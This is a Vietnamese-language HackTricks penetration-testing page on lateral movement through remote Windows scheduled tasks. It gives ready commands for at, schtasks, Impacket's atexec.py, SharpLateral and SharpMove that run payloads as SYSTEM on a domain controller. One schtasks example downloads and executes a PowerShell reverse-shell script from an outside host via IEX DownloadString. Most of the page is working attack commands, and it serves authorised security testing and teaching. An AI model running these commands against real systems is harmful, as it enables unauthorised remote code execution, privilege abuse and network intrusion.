# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Cách hoạt động

Khi có quyền quản trị trên một máy Windows, operator có thể tạo và khởi chạy một scheduled task từ xa. Tùy chọn `/S` chọn máy chủ từ xa, `/U` và `/P` cung cấp thông tin xác thực để tạo task khi cần, còn `/RU` chọn tài khoản mà task sẽ chạy dưới quyền tài khoản đó. Lệnh được tham chiếu bởi `/TR` phải tồn tại trên hệ thống từ xa.<sup>[[1]](#references)</sup>

Lệnh `at` cũ hơn cũng có thể lên lịch chạy một lệnh trên máy chủ từ xa khi dịch vụ Schedule đang chạy. Các job đã lên lịch sẽ chạy dưới tài khoản dịch vụ, thường là `SYSTEM`:<sup>[[5]](#references)</sup>

```cmd
at \\victim 23:00 shutdown -r
```

Tạo tác vụ rồi khởi chạy tác vụ đó:

```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```

Ví dụ:

```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```

Đối với tác vụ lặp lại hằng tuần, hãy sử dụng lịch hằng tuần hợp lệ và nêu rõ ngày:

```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```

Một task action cũng có thể gọi PowerShell trực tiếp. Ví dụ lab sau đây tải xuống và chạy một script; chỉ lưu trữ payload trên cơ sở hạ tầng được phép sử dụng trong quá trình đánh giá:

```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```

`atexec.py` của Impacket tự động hóa việc thực thi lệnh từ xa thông qua dịch vụ Task Scheduler và hỗ trợ xác thực bằng mật khẩu, NTLM hash hoặc Kerberos.<sup>[[2]](#references)</sup>

```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```

SharpLateral cung cấp một phương thức thực thi tác vụ đã lên lịch:<sup>[[3]](#references)</sup>

```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```

SharpMove cung cấp một triển khai Task Scheduler khác:<sup>[[4]](#references)</sup>

```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```

Thông tin thêm về [**việc sử dụng schtasks với silver tickets tại đây**](../active-directory-methodology/silver-ticket.md#host).

Xóa các tác vụ kiểm thử sau khi sử dụng:

```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```

## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
